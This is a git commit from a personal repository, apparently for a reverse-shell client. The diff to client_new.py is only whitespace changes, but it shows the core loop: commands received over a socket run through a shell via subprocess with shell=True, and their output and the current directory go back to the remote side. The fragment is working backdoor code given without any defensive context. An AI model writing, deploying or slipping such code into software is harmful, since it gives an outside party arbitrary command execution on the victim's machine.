a5f82d1f9dae7c4c306f0b9bd58790576bc1e797
dineshv52 <dineshv52@yahoo.in>
2019-03-05 22:15:18 +0530

    new one

--- client_new.py
+++ client_new.py
@@ -14,9 +14,9 @@ while True:
         os.chdir(data[3:].decode("utf-8"))
 
     if len(data) > 0:
-        cmd = subprocess.Popen(data[:].decode("utf-8"),shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
+        cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
         output_byte = cmd.stdout.read() + cmd.stderr.read()
-        output_str  = str(output_byte,"utf-8")
-        currentWD   = os.getcwd() + "> "
+        output_str = str(output_byte,"utf-8")
+        currentWD = os.getcwd() + "> "
         s.send(str.encode(output_str + currentWD))
         print(output_str)
